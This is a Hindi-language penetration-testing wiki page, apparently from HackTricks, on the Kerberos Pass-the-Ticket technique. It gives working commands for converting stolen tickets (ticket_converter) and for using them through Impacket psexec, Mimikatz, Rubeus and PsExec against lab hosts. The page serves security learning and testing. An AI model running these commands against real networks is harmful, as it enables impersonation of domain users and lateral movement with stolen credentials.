# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## अवलोकन

Pass-the-Ticket (PtT) attack में, adversary उस account का password जाने बिना ticket के principal के रूप में authenticate करने के लिए चुराए गए Kerberos ticket का उपयोग करता है। एक ticket-granting ticket (TGT) का उपयोग service tickets का अनुरोध करने के लिए किया जा सकता है, जबकि चुराया गया service ticket केवल अपनी target service और validity period तक सीमित होता है।<sup>[[1]](#references)</sup>

Ticket acquisition techniques के लिए देखें:

- [Windows से tickets प्राप्त करना](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Linux से tickets प्राप्त करना](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Linux और Windows Ticket Formats को Converting करना

Kerberos caches आमतौर पर Linux पर MIT `ccache` files और Windows पर `.kirbi` files के रूप में दिखाई देते हैं। `ticket_converter` input ticket और output path का उपयोग करके इन formats के बीच convert करता है।<sup>[[2]](#references)</sup>
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```
Kekeo Windows पर Kerberos ticket tooling भी प्रदान करता है।<sup>[[3]](#references)</sup>

## Ticket का उपयोग

Linux पर cache की ओर `KRB5CCNAME` को point करें और Impacket client को पासवर्ड पूछे बिना Kerberos का उपयोग करने का निर्देश दें:<sup>[[4]](#references)</sup>
```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
Windows पर, Mimikatz या Rubeus वर्तमान logon session में एक `.kirbi` ticket import कर सकते हैं। परिणामी cache की जांच करने के लिए `klist` का उपयोग करें।<sup>[[5]](#references)[[6]](#references)</sup>
```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
Ticket import, ticket द्वारा दर्शाए गए अधिकारों और target service की authorization policy से आगे privileges प्रदान नहीं करता। Expired, revoked, malformed या गलत scope वाले tickets विफल हो सकते हैं।<sup>[[1]](#references)</sup>

व्यापक Kerberos attack context और संबंधित ticket-acquisition techniques के लिए, Tarlogic की Kerberos attack guide देखें।<sup>[[7]](#references)</sup>

## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Impacket examples](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Kerberos attack techniques](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
{{#include ../../banners/hacktricks-training.md}}
